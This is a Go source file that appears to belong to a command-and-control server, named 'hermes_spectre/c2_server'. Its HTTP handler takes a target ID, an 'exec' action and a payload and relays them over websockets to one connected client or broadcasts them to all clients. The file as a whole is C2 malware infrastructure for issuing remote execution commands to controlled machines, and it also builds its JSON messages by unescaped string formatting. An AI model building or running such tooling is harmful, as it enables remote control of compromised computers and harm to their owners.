package api

import (
	"fmt"
	"log"
	"net/http"

	"hermes_spectre/c2_server/internal/websocket"

	"github.com/gin-gonic/gin"
)

type Action string

const (
	ActionExec Action = "exec"
)

type CommandPayload struct {
	TargetID string `json:"target_id" binding:"required"`
	Action   string `json:"action" binding:"required"`
	Payload  string `json:"payload"`
}

type APIHandler struct {
	Manager *websocket.ClientManager
}

func NewAPIHandler(manager *websocket.ClientManager) *APIHandler {
	return &APIHandler{Manager: manager}
}

func (h *APIHandler) HandleCommand(c *gin.Context) {
	var cmd CommandPayload
	if err := c.ShouldBindJSON(&cmd); err != nil {

		c.JSON(http.StatusBadRequest, gin.H{"status": "error", "message": fmt.Sprintf("Invalid command format: %v", err), "action": cmd.Action})
		return
	}

	commandMsg := fmt.Sprintf(`{"action": "%s", "payload": "%s"}`, cmd.Action, cmd.Payload)
	messageBytes := []byte(commandMsg)

	if cmd.TargetID == "all" {

		h.Manager.BroadcastToAll(messageBytes)
		log.Printf("INFO: Command '%s' broadcasted to all clients", cmd.Action)
		c.JSON(http.StatusOK, gin.H{"status": "success", "message": "Command broadcasted to all clients"})
		return
	}

	if err := h.Manager.SendToClient(cmd.TargetID, messageBytes); err != nil {
		log.Printf("ERROR: Failed to send command to %s: %v", cmd.TargetID, err)
		c.JSON(http.StatusNotFound, gin.H{"status": "error", "message": fmt.Sprintf("Client '%s' not found", cmd.TargetID)})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": "success", "message": fmt.Sprintf("Command sent to client %s", cmd.TargetID)})
	action := cmd.Action
	log.Printf("INFO:Action: %s", action)
	log.Printf("INFO:Payload: %s", cmd.Payload)
	log.Printf("INFO:Command '%s' sent  to client '%s'", cmd.Action, cmd.TargetID)

}
